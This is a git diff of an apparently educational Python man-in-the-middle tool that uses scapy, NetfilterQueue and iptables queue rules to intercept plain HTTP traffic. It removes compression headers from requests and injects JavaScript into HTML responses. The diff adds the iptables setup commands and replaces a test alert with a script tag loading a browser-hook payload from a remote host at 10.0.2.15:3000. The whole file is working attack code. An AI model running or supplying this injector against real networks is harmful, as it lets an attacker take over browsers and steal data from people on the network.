@@ -1,5 +1,11 @@
 #! /home/kali/.pyenv/versions/hacking/bin/python
 
+#works only on http clear all the cache in the browser
+#commands to run on terminal befor running the scripts these create a queue to packet to modify
+#iptables -I OUTPUT -j NFQUEUE --queue-num 0
+#iptables -I INPUT -j NFQUEUE --queue-num 0
+#iptables -I FORWARD -j NFQUEUE --queue-num 0
+
 # Scapy lets us probe, scan or attack networks.
 import scapy.all as scapy
 # NetfilterQueue provides access to packets matched by an iptables rule in Linux. 
@@ -29,14 +35,13 @@ def process_packet(packet):
             load = scapy_packet[scapy.Raw].load.decode()
             if scapy_packet[scapy.TCP].dport == 80:
                 print('[+] Request...')
-                print(scapy_packet.show())
                 # We search for a pattern that contain the encoding information in the request and replace it with nothing, allowing us to read the HTTP responses
                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", load) 
 
             # Check if the TCP layer has 80 in the sport section
             elif scapy_packet[scapy.TCP].sport == 80:
                 print('[+] Response...')
-                injection_code = "<script>alert('test');</script>"
+                injection_code = "<script src='http://10.0.2.15:3000/hook.js'></script>"
                 # Injecting javascript code to the HTML response
                 load = load.replace("</body>", injection_code + "</body>")
                 print("[+] Code Injected...")
@@ -52,7 +57,8 @@ def process_packet(packet):
             if load != scapy_packet[scapy.Raw].load:
                 new_packet = set_load(scapy_packet, load)
                 packet.set_payload(bytes(new_packet))
-                print("[+] Setting payload")
+                print("[+] Sending Payload..")
+                
         except UnicodeDecodeError:
             pass
 
